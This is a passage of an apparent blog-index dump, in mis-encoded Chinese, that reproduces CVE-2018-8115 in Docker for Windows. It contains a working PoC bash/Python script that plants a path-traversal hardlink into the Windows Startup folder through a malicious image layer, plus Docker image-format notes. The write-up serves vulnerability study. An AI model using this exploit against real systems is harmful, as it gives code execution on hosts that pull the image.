[{"categories":["æœ‰è¶£çš„æ¸—é€æµ‹è¯•"],"content":"Docker for Windows","date":"2020-09-15","objectID":"/2020/09/cve-2018-8115-analysis/","tags":["æ¼æ´å¤ç°"],"title":"CVE-2018-8115 æ¼æ´å¤ç°","uri":"/2020/09/cve-2018-8115-analysis/"},{"categories":["æœ‰è¶£çš„æ¸—é€æµ‹è¯•"],"content":"å‰è¨€ å¾®è½¯ä¸ Docker åˆä½œï¼Œè®© Docker èƒ½å¤Ÿè·‘åœ¨ Windows ä¸Šä»¥åŠæ”¯æŒ Windows å®¹å™¨ï¼Œåšäº†å¾ˆå¤šå·¥ä½œï¼Œå…¶ä¸­ä¸€ä¸ªæ˜¯å¼€å‘äº† hcsshim å¥—ä»¶ï¼Œè¯¥å¥—ä»¶å¯ä½¿ç”¨Windows Host Compute Serviceï¼ˆHCSï¼‰å¯åŠ¨å’Œç®¡ç† Windows å®¹å™¨ã€‚å®ƒè¿˜åŒ…å«ç”¨äºç®¡ç† Windows å®¹å™¨çš„å…¶ä»–å¸®åŠ©ç¨‹åºå’ŒåŠŸèƒ½ï¼Œä¾‹å¦‚ç”¨äºä¸»æœºç½‘ç»œæœåŠ¡ï¼ˆHNSï¼‰çš„ Golang ç•Œé¢ã€‚ åœ¨ hcsshim v0.6.10 ä¹‹å‰çš„ç‰ˆæœ¬ä¸­ï¼Œè¯¥å¥—ä»¶ç”±äºå°†æœªç»å¤„ç†çš„è¾“å…¥ä¸å°† Golang çš„ filepath.Join ç»“åˆä½¿ç”¨ï¼Œå¯¼è‡´æ”»å‡»è€…å¯åˆ©ç”¨ ../ è¿™æ ·çš„æ§åˆ¶åºåˆ—å­—ç¬¦ä¸²æ¥è¾¾åˆ°æ§åˆ¶ç›®å½•çš„æ•ˆæœï¼Œä»è€Œå®ç°åœ¨å®¿ä¸»æœºç³»ç»Ÿä¸­åˆ›å»ºã€åˆ é™¤å’Œæ›¿æ¢æ–‡ä»¶ï¼Œç”šè‡³å¯ä»¥å†™å…¥æ¶æ„è„šæœ¬åˆ°è‡ªå¯é¡¹ç›®å½•ï¼Œæ¥è¾¾åˆ°å‘½ä»¤æ‰§è¡Œçš„æ•ˆæœã€‚è€Œä½¿ç”¨äº†æ­¤å¥—ä»¶çš„ Docker for Windows å—åˆ°æ­¤æ¼æ´å½±å“ï¼Œå¦‚æœæ”»å‡»è€…æ¶æ„æ„é€ äº†é•œåƒï¼Œå—å®³è€… pull é•œåƒå³å¯é€ æˆæ”»å‡»ã€‚ ","date":"2020-09-15","objectID":"/2020/09/cve-2018-8115-analysis/:1:0","tags":["æ¼æ´å¤ç°"],"title":"CVE-2018-8115 æ¼æ´å¤ç°","uri":"/2020/09/cve-2018-8115-analysis/"},{"categories":["æœ‰è¶£çš„æ¸—é€æµ‹è¯•"],"content":"ç¯å¢ƒæ­å»º ç”±äºè¯¥æ¼æ´å‡ºç°åœ¨ Docker for Windows ä¸Šï¼Œå¹¶ä¸”éœ€è¦è‡ªå·±æ„å»ºé•œåƒï¼Œæ‰€ä»¥éœ€è¦ä½¿ç”¨åˆ°ä»¥ä¸‹ç¯å¢ƒï¼š Windows 10 2004ï¼šç‰ˆæœ¬æ— å¼ºåˆ¶è¦æ±‚ï¼ŒWin10 å°±è¡Œï¼Œæ–‡ç« ä¸­ä½¿ç”¨çš„ç³»ç»Ÿå†…éƒ¨ç‰ˆæœ¬å·ä¸º 19041.450 Ubuntu 20.04 LTSï¼šç‰ˆæœ¬æ— å¼ºåˆ¶è¦æ±‚ï¼Œç”¨æ¥æ­å»ºç§æœ‰ä»“åº“ Registry Docker for Windows 17.12.0-ce-win47ï¼šhttps://docs.docker.com/docker-for-windows/release-notes/#docker-community-edition-17120-ce-win47-2018-01-12 VMwareÂ® Workstation 15 Pro ","date":"2020-09-15","objectID":"/2020/09/cve-2018-8115-analysis/:2:0","tags":["æ¼æ´å¤ç°"],"title":"CVE-2018-8115 æ¼æ´å¤ç°","uri":"/2020/09/cve-2018-8115-analysis/"},{"categories":["æœ‰è¶£çš„æ¸—é€æµ‹è¯•"],"content":"Docker for Windows å®‰è£… é¦–å…ˆï¼Œåœ¨è™šæ‹Ÿæœºä¸Šè£…å¥½ Windows 10 2004ï¼Œå¼€æœºå‰è°ƒæ•´å¦‚ä¸‹é…ç½®ï¼š å†…å­˜è®¾ç½® 4G ä»¥ä¸Š å¼€å¯è™šæ‹ŸåŒ–å¼•æ“ \" è®¾ç½®å¥½ä¹‹åï¼Œå³å¯å¼€æœºï¼Œå¹¶å®‰è£… Docker for Windows Installer.exeï¼Œå®‰è£…æ¯”è¾ƒç®€å•ï¼ŒæŒ‰ç…§å¦‚ä¸‹æ­¥éª¤å³å¯ï¼š \" å®‰è£…å®Œæ¯•ä¹‹åä¼šæ³¨é”€ä¸€æ¬¡ï¼Œå†æ¬¡ç™»å½•ä¹‹åï¼ŒDocker ä¼šè‡ªåŠ¨å¯åŠ¨ï¼Œå¹¶ä¸”ä¼šè¦æ±‚å¼€å¯ Hyper-Vï¼š \" å•å‡» OK ä¹‹åï¼Œä¼šè‡ªåŠ¨é‡å¯ï¼Œå¹¶å®‰è£… Hyper-Vï¼Œé‡å¯ä¹‹åï¼Œä¼šçœ‹ä¸‹å¦‚ä¸‹æç¤ºï¼š \" å•å‡» Startï¼Œéšåç­‰å¾… Docker å¯åŠ¨ï¼Œç­‰å¾…è‰¯ä¹…ä¹‹åä¼šå‡ºç°ä¸‹é¢è¿™ä¸ªé”™è¯¯æç¤ºï¼š \" å‡ºç°è¿™ä¸ªæç¤ºæ˜¯å› ä¸ºæ˜¯åœ¨è™šæ‹Ÿæœºä¸Šå®‰è£…çš„ Docker for Windowsï¼Œå¦‚æœæ˜¯çœŸå®æœºå™¨å°±ä¸ä¼šå‡ºç°è¿™ä¸ªæƒ…å†µã€‚è§£å†³æ–¹æ³•æ˜¯å³é”®å³ä¸‹è§’çš„ Docker å›¾æ ‡ï¼Œå•å‡» Switch to Windows containersï¼Œå¦‚ä¸‹ï¼š \" åˆ‡æ¢äº†ä¹‹å Docker ä¼šæ­£å¸¸å¯åŠ¨æˆåŠŸï¼Œåœ¨å‘½ä»¤è¡Œè¾“å…¥ docker info å¯çœ‹åˆ° Docker ç›¸å…³ä¿¡æ¯ï¼š \" ","date":"2020-09-15","objectID":"/2020/09/cve-2018-8115-analysis/:2:1","tags":["æ¼æ´å¤ç°"],"title":"CVE-2018-8115 æ¼æ´å¤ç°","uri":"/2020/09/cve-2018-8115-analysis/"},{"categories":["æœ‰è¶£çš„æ¸—é€æµ‹è¯•"],"content":"Registry æ­å»º é¦–å…ˆéœ€å°† Ubuntu 20.04 ç³»ç»Ÿå®‰è£…å¥½ï¼Œè£…å¥½ä¹‹ååœ¨å‘½ä»¤è¡Œè¾“å…¥ curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun å®‰è£… Dockerï¼Œæ³¨æ„éœ€è¦ root æƒé™ï¼š \" è®¾ç½® Docker é•œåƒåŠ é€Ÿï¼Œè¿™æ ·ä¸‹è½½é•œåƒæ—¶å¿«ä¸€ç‚¹ï¼Œè¾“å…¥å‘½ä»¤ echo '{\"registry-mirrors\":[\"https://hub-mirror.c.163.com/\"]}' \u003e /etc/docker/daemon.json (å¦‚æ–‡ä»¶å·²å­˜åœ¨è¯·æ ¹æ®å®é™…æƒ…å†µæ·»åŠ )ï¼š \" è¾“å…¥ä»¥ä¸‹è¯­å¥é‡å¯ Dockerï¼š systemctl daemon-reload systemctl restart docker ä½¿ç”¨ docker info å¯æŸ¥çœ‹æ˜¯å¦è®¾ç½®æˆåŠŸï¼š \" Docker å®‰è£…å¥½ä¹‹åï¼Œæ¥ä¸‹æ¥æ­å»º Registryï¼Œè¾“å…¥å¦‚ä¸‹å‘½ä»¤ï¼š docker run -d -p 5000:5000 --name registry docker.io/library/registry:2 \" å®¹å™¨è¿è¡Œèµ·æ¥ä¹‹åä½¿ç”¨ curl http://127.0.0.1:5000/v2/_catalog å¯æµ‹è¯•æ˜¯å¦æ­å»ºæˆåŠŸï¼š \" ","date":"2020-09-15","objectID":"/2020/09/cve-2018-8115-analysis/:2:2","tags":["æ¼æ´å¤ç°"],"title":"CVE-2018-8115 æ¼æ´å¤ç°","uri":"/2020/09/cve-2018-8115-analysis/"},{"categories":["æœ‰è¶£çš„æ¸—é€æµ‹è¯•"],"content":"å¤ç°æ¼æ´ è¯¥æ¼æ´ä¸»è¦é’ˆå¯¹ Docker åœ¨ pull é•œåƒæ—¶ï¼Œæœªå¤„ç†å¥½é•œåƒä¸­çš„æ–‡ä»¶æ‹·è´ï¼Œå¯¼è‡´å¯ä»¥ç©¿è¶Šè·¯å¾„æ¥å†™å…¥æ¶æ„æ–‡ä»¶åˆ°æŒ‡å®šè·¯å¾„ã€‚æ‰€ä»¥ç¬¬ä¸€ä»¶äº‹æ˜¯å…ˆæ„å»ºæ¶æ„é•œåƒï¼Œéœ€åœ¨åˆšæ‰æ­å»ºçš„ Registry ä¸Šæ„å»ºã€‚ ç”±äºä½œè€…æä¾›çš„ PoC å­˜åœ¨ä¸€å®šçš„é—®é¢˜ï¼Œç›´æ¥ä½¿ç”¨ä¼šå¤±è´¥ï¼Œè¿™é‡Œå°†å…¶è¿›è¡Œäº†ä¿®æ”¹ï¼š #!/bin/bash # # Copyright (C) 2018, Michael Hanselmann \u003chttps://hansmi.ch/\u003e # set -e -u -o pipefail set -x registry=http://localhost:5000 tmpdir=$(mktemp -d) trap 'rm -rf \"$tmpdir\"' EXIT tmplayer=\"${tmpdir}/layer.tar\" digest() { echo -n sha256: \u0026\u0026 \\ sha256sum | cut -c-64 } upload() { local datafile=\"$1\" local digest=\"$(digest \u003c \"$datafile\")\" # Prepare upload local upload_location=$( curl -v --dump-header - -XPOST \"${registry}/v2/evil/image/blobs/uploads/\" | perl -ne 'chomp \u0026\u0026 /^Location:\\s*(.+?)\\s*$/ \u0026\u0026 print $1' ) echo \"upload_location=${upload_location}\" \u003e\u00262 curl -v -XPUT --header 'Expect:' --data-binary \"@${datafile}\" \\ --header 'Content-Type: application/octet-stream' \\ \"${upload_location}\u0026digest=${digest}\" echo -n \"$digest\" } write_base_layer() { # Tar containing hive files and dummy Dockerfile base64 -d \u003c\u003c'EOF' | gunzip -c H4sIANXIjFoAA+3d3W7bdBjHcbdaQYoYTGy89MyHcNL43elBQU6bqhUr6QtjVEJDJnOyqC9Bjrt2 HO0SuAkkBBfADXDCMTfAEadcQrFju9ip2yWd46zx9yM1cfz4n3hOn7/n6Kdm2z7bcOynjttfkqrr 3UOnL+ROCl11LymaKsiqf6uokiTrgiQrmqkL4ln+u3LZSd+zXX9XXvd5hv9xt4RWEx9u1q3d1Y3N rxtLLdexvW7v2OseOSuyLi8rkqLK5pKumrWa4b87FUUXt/Yeb3651ny8t9T2f19sz3NXZKOiSqJ9 9TC/2rq2enR1ddqHaKZNqOVTJEm7tv+D5XT/S4qkCqI+4f0aKHn/D97/6nbyLLDWax04btDbOb3G q+Z/XVUS77/sv/+arsnM/0VQR5j/1StmfVWpKLKaqLj2af/pirVjNTr1Hct3YMXWBrd1qxM+rO8N 7jqDxzuNaKNH0dq6v3Yn2rBjVU8bbctqrEYbrW8Gt6tW+Nh/nahej+uN6DXWrdWqtbuVfP6H0cK+ 9cWBv5OX9udZ8LiiXDqVqdknMMOUzWU5OCteOoGpt+S0FfZ/7i2f4s/n18//ujHU/4qi+/1fSBOV vP/Xd5tb4lG35fb6vbZXPbaPe33Hfe64dyt3K6vN7X3x/98NsTrtvUXeUmf+je7zN+T6T5c5/xeC 679ym1DLp9zk+k82uf4rwuD9H7r+c9r2yaH3yP9/wHdrzqFnv+5rjD//G5LG53+FGHH+12TTqBlX zv/+lWDm/H8xLHP+T1Yvz/8X1WkfopkW9n/uLZ9y/fWfkjH/q3rQ/1z/TZ7rdNpz/v1cYl2w/FZi WQwW7qW3mZT5V9Sb7d1OEftRBov39bmff/vwyb+//sUhBQAAAIAZ9+z77vFg4V52/Zfz8/PjA1H4 84+3L64T/VXncf08Ei+fDdWT7vg/u83mV8HyN/42/QNBCLYPfoIn/mlwf+flD/79y2jMAyH4TODb wVhh/oHwufCeMBderS68P1j3cbgu/OBgQfRvxPlw20V/ZLRteJtet/BOUBgaN/z473evPXwAAAAA ANwKGfmvPfso3xDI+PkvTdUU8l9FGDX/pZh6TRk//xUPy85/JaoZ+a+4Ou1DNNPC/s+95VPGz38p UtD/5L8mj/xXeQX5r/nfPyL/BQAAAAAlQP4rPY78FwAAAABgFmXlv5zWidv1XuSWCBk//6VrKn// sRCj5r9UU5PM8fNf8bDs/FeimpH/iqvTPkQzLcp/5d3yKTf4+1+yyt9/LgT5r/IK8l//7C+S/wIA AACAEiD/lR5H/gsAAAAAMIuy8l+9tndqu85U81+yRv6rCKN+/69RW9aWx85/XQzL/v7fRDXj+3/j 6rQP0UyL8l95t3zKTfJfQf+T/5o88l/lFeS/Pv3sPvkvAAAAACgB8l/pceS/AAAAAACzKCv/9aLv OXl+H9wN8l+yZJD/KsKo+S+zVjPU8fNf8bDs/FeimpH/iqvTPkQzLcp/5d3yKTf4/kcj6H/yX5NH /qu8gvzXJz9+QP4LAAAAAEqA/Fd6HPkvAAAAAAAAAAAAAAAAAAAAAG+q/wA9MZkjAPAAAA== EOF } write_layer() { write_base_layer \u003e \"${tmpdir}/demo.tar\" python3 -c ' import sys import time import tarfile import tempfile import struct startupfile = \\ \"ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/evil.bat\" with tempfile.NamedTemporaryFile() as script, \\ tarfile.open(sys.argv[1], \"w\", format=tarfile.PAX_FORMAT) as tar: # Generate new digest every time script.write(\"echo Hello World {}\\r\\npause\\r\\n\".format(time.time()).encode(\"ascii\")) script.flush() tar.add(script.name, arcname=\"Files/script.bat\") # Hardlink for startup script info = tarfile.TarInfo(\"Files\\\\../../../../../../../../\" + startupfile) info.type = tarfile.LNKTYPE info.linkname = \"Files\\\\script.bat\" tar.addfile(info) ' \"${tmpdir}/evil.tar\" cat \u003c \"${tmpdir}/demo.tar\" \u003e \"$tmplayer\" tar --concatenate --absolute-names -f \"$tmplayer\" \"${tmpdir}/evil.tar\" tar -Ptvf \"$tmplayer\" } write_layer layer_digest=$(upload \"$tmplayer\") layer_size=$(stat --format='%s' \"$tmplayer\") cat \u003e\"${tmpdir}/config.json\" \u003c\u003cEOF { \"architecture\": \"amd64\", \"name\": \"image\", \"tag\": \"10\", \"config\": { \"Hostname\": \"\", \"Domainname\": \"\", \"User\": \"\", \"AttachStdin\": false, \"AttachStdout\": false, \"AttachStderr\": false, \"Tty\": false, \"OpenStdin\": false, \"StdinOnce\": false, \"Env\": null, \"Cmd\": [ \"noop\" ], \"Image\": \"sha256:8a62949f00589b4b9e99586bd40555ad36c1719a4d1c60d7094fbfb5997c4d12\", \"Volumes\": null, \"WorkingDir\": \"\", \"Entrypoint\": null, \"On","date":"2020-09-15","objectID":"/2020/09/cve-2018-8115-analysis/:3:0","tags":["æ¼æ´å¤ç°"],"title":"CVE-2018-8115 æ¼æ´å¤ç°","uri":"/2020/09/cve-2018-8115-analysis/"},{"categories":["æœ‰è¶£çš„æ¸—é€æµ‹è¯•"],"content":"è¸©å‘æ—¥è®° åœ¨æœ€å¼€å§‹ï¼Œç›´æ¥ä½¿ç”¨ä½œè€…çš„ PoC æ—¶ï¼Œä¼šç›´æ¥æŠ¥é”™ï¼Œæœ€åä¸€æ­¥ä¸Šä¼ é•œåƒåˆ° Registry æ—¶ä¼šç›´æ¥æç¤º 500ï¼Œå¦‚ä¸‹ï¼š \" å› ä¸ºå¯¹ Docker ä¸æ˜¯å¾ˆç†Ÿæ‚‰ï¼Œæ‰€ä»¥è¿™ä¸ªé—®é¢˜ä¸çŸ¥é“æ€ä¹ˆå»è§£å†³ï¼Œé€šè¿‡ä¸æ–­çš„æœå¯»èµ„æ–™ï¼Œæ·±å…¥å­¦ä¹ äº† Docker çš„ä¸€ç‚¹çŸ¥è¯†ï¼Œæ‰å°†è¯¥é—®é¢˜è§£å†³ï¼Œè¿™é‡Œè®°å½•ä¸‹è§£å†³çš„è¿‡ç¨‹ã€‚ ","date":"2020-09-15","objectID":"/2020/09/cve-2018-8115-analysis/:4:0","tags":["æ¼æ´å¤ç°"],"title":"CVE-2018-8115 æ¼æ´å¤ç°","uri":"/2020/09/cve-2018-8115-analysis/"},{"categories":["æœ‰è¶£çš„æ¸—é€æµ‹è¯•"],"content":"Dockerå­¦ä¹  ä¼—æ‰€å‘¨çŸ¥ï¼ŒDocker æ˜¯é€šè¿‡é•œåƒæ¥åˆ›å»ºå®¹å™¨çš„ã€‚è€Œä¸€ä¸ªé•œåƒçš„æ„æˆï¼Œæ˜¯ç”±å±‚ï¼ˆlayerï¼‰çš„å½¢å¼æ„æˆçš„ã€‚åœ¨æ¯ä¸€å±‚ä¸­ï¼Œå­˜å‚¨çš„éƒ½æ˜¯å½“å‰å±‚ä¸ä¸Šä¸€å±‚ä¹‹é—´çš„æ–‡ä»¶å˜åŒ–ï¼Œåœ¨å®¹å™¨æ„å»ºçš„æ—¶å€™ï¼ŒDocker ä¼šå°†æ¯ä¸€å±‚ä¾æ¬¡çš„ç»„åˆåœ¨ä¸€èµ·å½¢æˆæ–‡ä»¶ç³»ç»Ÿï¼Œæœ€ååœ¨é¡¶å±‚åŠ ä¸Šå®¹å™¨å±‚ä»¥ä¾¿ä¿®æ”¹ã€‚åœ¨é•œåƒä¸­ï¼Œæ¯å¤šä¸€å±‚é•œåƒçš„ä½“ç§¯å°±ä¼šå¤§ä¸€äº›ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆ Dockerfile æ¨èå°½å¯èƒ½çš„å‡å°‘è¡Œæ•°ï¼Œå› ä¸ºæ¯å¤šæ·»åŠ ä¸€è¡Œï¼Œé•œåƒä¸­çš„å±‚å°±å¤šä¸€å±‚ï¼Œæœ€åå¯¼è‡´é•œåƒä½“ç§¯å˜å¾—å¾ˆå¤§ã€‚ ä¸Šé¢å¤§æ¦‚ä»‹ç»äº†é•œåƒçš„æ„é€ ï¼Œæ¥ä¸‹æ¥è¯¦ç»†ä»‹ç»ä¸‹é•œåƒçš„æ–‡ä»¶å­˜å‚¨ç»“æ„ï¼Œè¿™é‡Œä½¿ç”¨ Windows å®¹å™¨ NanoServer æ¥åšæ¼”ç¤ºï¼Œé¦–å…ˆåœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥å‘½ä»¤ docker pull mcr.microsoft.com/windows/nanoserver:10.0.14393.2068 ä¸‹è½½ NanoServer é•œåƒï¼Œå¦‚ä¸‹ï¼š \" æ¥ä¸‹æ¥ï¼Œå°†é•œåƒå¯¼å‡ºä¸º tar æ ¼å¼çš„æ–‡ä»¶ï¼Œåœ¨ PowerShell ä¸­è¾“å…¥å¦‚ä¸‹å‘½ä»¤ï¼š cd ~ mkdir test cd test docker save -o nanoserver.tar mcr.microsoft.com/windows/nanoserver:10.0.14393.2068 \" å¯¼å‡ºä¹‹åå°†å…¶è§£å‹ï¼Œå¯çœ‹åˆ°å…¶ä¸­æœ‰å¦‚ä¸‹æ–‡ä»¶å’Œç›®å½•ï¼š \" ä¸€ä¸ªå®Œæ•´çš„é•œåƒçš„ tar åŒ…æ ¼å¼ä¸€èˆ¬å¦‚ä¸‹ï¼š manifest.jsonï¼šæ•´ä¸ªé•œåƒçš„æ¸…å•ä¿¡æ¯ï¼ŒåŒ…å«ç€é•œåƒæ¯ä¸€å±‚æ•°æ®æ‰€å¤„çš„æ–‡ä»¶ä½ç½®ï¼Œå¹¶ä¸”è¯¥æ–‡ä»¶çš„ SHA256 è¿˜ä¸é•œåƒçš„æ‘˜è¦æœ‰å…³ é•œåƒid.jsonï¼šé•œåƒçš„é…ç½®ä¿¡æ¯ï¼ŒåŒ…å«é•œåƒçš„çš„å„ä¸ªä¿¡æ¯ï¼Œæœ€é‡è¦çš„æ˜¯åŒ…å«é•œåƒä¿®æ”¹çš„å†å²è®°å½•ä»¥åŠæ¯ä¸€å±‚æ•°æ®çš„æ‘˜è¦ repositoriesï¼šä¸€èˆ¬ä¿å­˜çš„æ˜¯é•œåƒçš„ tag ä¸ id çš„å¯¹åº”å…³ç³» æ¯ä¸€å±‚çš„ç›®å½•ï¼š jsonï¼šè¯¥å±‚çš„ä¿¡æ¯ layer.tarï¼šè¯¥å±‚æœªå‹ç¼©çš„ tar åŒ…ï¼Œå­˜å‚¨ä¸ä¸Šä¸€å±‚çš„æ–‡ä»¶å˜åŒ– VERSIONï¼šè¯¥å±‚çš„ç‰ˆæœ¬ï¼Œä¸€èˆ¬ä¸º 1.0 é¦–å…ˆæ¥çœ‹ manifest.jsonï¼Œè¯¥æ–‡ä»¶æ˜¯æ•´ä¸ªé•œåƒçš„æ¸…å•æ–‡ä»¶ï¼Œä¿å­˜çš„é•œåƒä¸­æ¯ä¸€å±‚çš„æ•°æ®çš„æ‰€åœ¨ä½ç½®ï¼Œå¦‚ä¸‹ï¼š [ { \"Config\": \"8a62949f00589b4b9e99586bd40555ad36c1719a4d1c60d7094fbfb5997c4d12.json\", \"RepoTags\": [ \"mcr.microsoft.com/windows/nanoserver:10.0.14393.2068\" ], \"Layers\": [ \"ad4ea25c1eec6037158aa418802620adec29cc64c56569c38ca5211ab74f93da\\\\layer.tar\", \"3128d665ad88b5e4d2111974265579b4b0fc70bfe10da79c27fc984f31098431\\\\layer.tar\" ], \"LayerSources\": { \"sha256:06def82ae218583423386cf68ab2dbb0715e69132d9b74e2fbdd9173142ef6f7\": { \"mediaType\": \"application/vnd.docker.image.rootfs.foreign.diff.tar.gzip\", \"size\": 152802641, \"digest\": \"sha256:cb1aafb7147372cc64faa070b94a893b8cd2e3de3a0e8001dc225c627d991c58\", \"urls\": [ \"https://go.microsoft.com/fwlink/?linkid=867858\" ] }, \"sha256:6c357baed9f5177e8c8fd1fa35b39266f329535ec8801385134790eb08d8787d\": { \"mediaType\": \"application/vnd.docker.image.rootfs.foreign.diff.tar.gzip\", \"size\": 252691002, \"digest\": \"sha256:bce2fbc256ea437a87dadac2f69aabd25bed4f56255549090056c1131fad0277\", \"urls\": [ \"https://go.microsoft.com/fwlink/?linkid=837858\" ] } } } ] åœ¨è¯¥æ–‡ä»¶ä¸­ï¼Œä»¥ä¸‹å­—æ®µæ˜¯ç›¸å¯¹é‡è¦çš„ï¼š Configï¼šæŒ‡å®šé•œåƒçš„é…ç½®æ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°é•œåƒè§£å‹ç›®å½•ä¸‹æœ‰åŒåçš„ 8a62949f00589b4b9e99586bd40555ad36c1719a4d1c60d7094fbfb5997c4d12.json æ–‡ä»¶ RepoTagsï¼šé•œåƒçš„ name ä¸ tagï¼Œåœ¨è¿™é‡Œ name ä¸º mcr.microsoft.com/windows/nanoserverï¼Œtag ä¸º 10.0.14393.2068 Layersï¼šä¸€ä¸ªä¿å­˜æ¯å±‚çš„ layer.tar æ–‡ä»¶è·¯å¾„çš„åˆ—è¡¨ï¼Œé¡ºåºç”±åº•å±‚åˆ°é¡¶å±‚ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œçš„ä¸¤ä¸ªå€¼åˆ†åˆ«å¯¹åº”è§£å‹ç›®å½•ä¸­çš„æ–‡ä»¶ \" å†æ¥çœ‹ 8a62949f00589b4b9e99586bd40555ad36c1719a4d1c60d7094fbfb5997c4d12.jsonï¼Œè¯¥æ–‡ä»¶ä¸ºé•œåƒçš„é…ç½®ä¿¡æ¯ï¼ŒåŒ…å«äº†é•œåƒçš„å¤§éƒ¨åˆ†ä¿¡æ¯ï¼Œå…¶ä¸­æœ€é‡è¦çš„å­—æ®µæ˜¯ history ä¸ rootfsï¼Œå¦‚ä¸‹ï¼ˆä¸ºèŠ‚çœç¯‡å¹…è¿™é‡Œçœç•¥äº†éƒ¨åˆ†ä¿¡æ¯ï¼‰ï¼š { // ... \"history\": [ { \"created\": \"2016-12-13T10:47:17Z\", \"created_by\": \"Apply image 10.0.14393.0\" }, { \"created\": \"2018-02-13T19:43:23Z\", \"created_by\": \"Install update 10.0.14393.2068\" } ], \"rootfs\": { \"type\": \"layers\", \"diff_ids\": [ \"sha256:6c357baed9f5177e8c8fd1fa35b39266f329535ec8801385134790eb08d8787d\", \"sha256:06def82ae218583423386cf68ab2dbb0715e69132d9b74e2fbdd9173142ef6f7\" ] } } å¯ä»¥çœ‹åˆ° history è®°å½•çš„æ˜¯é•œåƒä¿®æ”¹çš„ä¿¡æ¯ï¼Œè€Œ rootfs çš„ diff_ids è®°å½•çš„æ˜¯æ¯ä¸€å±‚çš„ Digestã€‚åœ¨è¿™ä¸ªæ¼”ç¤ºä¸­ history å¹¶ä¸é‡è¦ï¼Œè¿™é‡Œç€é‡è®²ä¸€ä¸‹ rootfsã€‚ rootfs å­˜å‚¨çš„æ˜¯æ¯ä¸€å±‚çš„ Digestï¼Œä¹Ÿå°±æ˜¯æ¯ä¸€å±‚çš„ layer.tar çš„ SHA256ï¼Œæ ¼å¼ä¸º sha256:SHA256(layer.tar)ï¼Œé¡ºåºç”±åº•å±‚åˆ°é¡¶å±‚ã€‚è¿™é‡Œæˆ‘ä»¬å®è·µä¸€ä¸‹ï¼Œåœ¨ PowerShell ä¸­ä½¿ç”¨ Get-FileHash -Algorithm SHA256 æ–‡ä»¶å è®¡ç®—æ–‡ä»¶çš„ SHA256ï¼Œè®¡ç®—ç»“æœå¦‚ä¸‹ï¼š \" å†æ¥çœ‹è¯¥æ–‡ä»¶æœ¬èº«ï¼Œè¯¥æ–‡ä»¶çš„ SHA256ï¼Œä¸ä»…ä¸ºå®ƒè‡ªèº«çš„æ–‡ä»¶åï¼Œè¿˜ä¸ºè¯¥é•œåƒçš„ IMAGE IDï¼Œå¦‚ä¸‹ï¼š \" æœ€åå†æ¥çœ‹æ¯ä¸€å±‚ç›®å½•ä¸­çš„å†…å®¹ï¼Œæ¯å±‚çš„ç›®å½•åçš„è®¡ç®—æ–¹å¼æ²¡æœ‰æ‰¾åˆ°ï¼Œè¿™ä¸ªä¸é‡è¦ï¼Œåªè¦èƒ½åœ¨ manifest.json æ–‡ä»¶ä¸­å†™å¯¹å°±è¡Œäº†ã€‚å…¶æ¬¡æ˜¯ç›®å½•ä¸­çš„å†…å®¹ï¼ŒVERSION æ˜¯ç‰ˆæœ¬ä¿¡æ¯ï¼Œè¿™ä¸ªä¸ç”¨ç®¡ï¼Œlayer.tar æ˜¯é‡è¦çš„å±‚æ¬¡æ–‡ä»¶å˜åŒ–ä¿¡æ¯ï¼Œè¯¥æ–‡ä»¶çš„ SHA256 éœ€è¦å†™å…¥åˆ°é•œåƒé…ç½®æ–‡ä»¶ä¸­ï¼Œtar åŒ…é‡Œçš„æ–‡ä»¶å†…å®¹å…¨æ˜¯ä¸Šä¸€å±‚åˆ°è¿™ä¸€å±‚ä¹‹é—´çš„æ–‡ä»¶å˜åŒ–ä¿¡æ¯ï¼Œä¹Ÿå¯ä»¥å…ˆä¸ç”¨ç®¡ã€‚æœ€ä¸»è¦çš„æ˜¯ .json è¿™ä¸ªæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶ä¸­è®°å½•äº†è¯¥å±‚çš„ä¸€äº›ä¿¡æ¯ï¼Œå…¶ä¸­æœ€é‡è¦çš„å­—æ®µæ˜¯ id ä¸ parentã€‚id å…¶å®å°±æ˜¯å½“å‰ç›®å½•çš„åç§°ï¼Œparent ä¸ºçˆ¶å±‚ç›®å½•çš„åç§°ï¼Œå¦‚æœæ²¡æœ‰çˆ¶å±‚åˆ™æ²¡æœ‰è¿™ä¸ªå­—æ®µï¼Œè¿™é‡Œçš„æ¼”ç¤ºç»“æœå¦‚ä¸‹ï¼š \" æ€»ç»“ä¸‹é•œåƒçš„å­˜å‚¨è¦ç‚¹ï¼š é•œåƒå­˜å‚¨çš„æ ¼å¼ä¸€èˆ¬ä¸º manifest.jsonã€é•œåƒid.jsonã€å„å±‚çš„ç›®å½•ï¼Œè€Œå„å±‚çš„ç›®å½•ä¸‹å­˜åœ¨ layer.tarã€jsonã€VERSION é•œåƒid.json ä¿å­˜ç€é•œåƒçš„å¤§éƒ¨åˆ†ä¿¡æ¯ï¼Œå…¶ä¸­ rootfs è®°è½½ç€æ¯ä¸€å±‚çš„ Digestï¼Œé¡ºåºç”±åº•å±‚åˆ°é¡¶å±‚ã€‚è¯¥æ–‡ä»¶æœ¬èº«çš„ SHA256 ä¿¡æ¯ä¸ºå®ƒè‡ªå·±çš„æ–‡ä»¶åã€é•œåƒ id manifest.json æŒ‡å®šé•œåƒçš„é…ç½®æ–‡ä»¶åç§°ï¼Œè¿˜åŒ…å«ç€æ¯ä¸€å±‚æ–‡ä»¶çš„å…·ä½“ä½ç½® æ¯ä¸€å±‚ç›®å½•ä¸‹çš„ layer.tar ä¸ºä¸»è¦çš„å±‚æ¬¡æ–‡ä»¶å˜åŒ–ä¿¡æ¯ï¼Œjson æ–‡ä»¶è®°è½½ç€è¯¥å±‚çš„ä¿¡æ¯ï¼Œå…¶ä¸­åŒ…æ‹¬æŒ‡å‘çˆ¶å±‚çš„ç›®å½• parent å­—æ®µ ","date":"2020-09-15","objectID":"/2020/09/cve-2018-8115-analysis/:4:1","tags":["æ¼æ´å¤ç°"],"title":"CVE-2018-8115 æ¼æ´å¤ç°","uri":"/2020/09/cve-2018-8115-analysis/"},{"categories":["æœ‰è¶£çš„æ¸—é€æµ‹è¯•"],"content":"é—®é¢˜åˆ†æ å¤§æ¦‚äº†è§£äº†é•œåƒçš„å­˜å‚¨æ 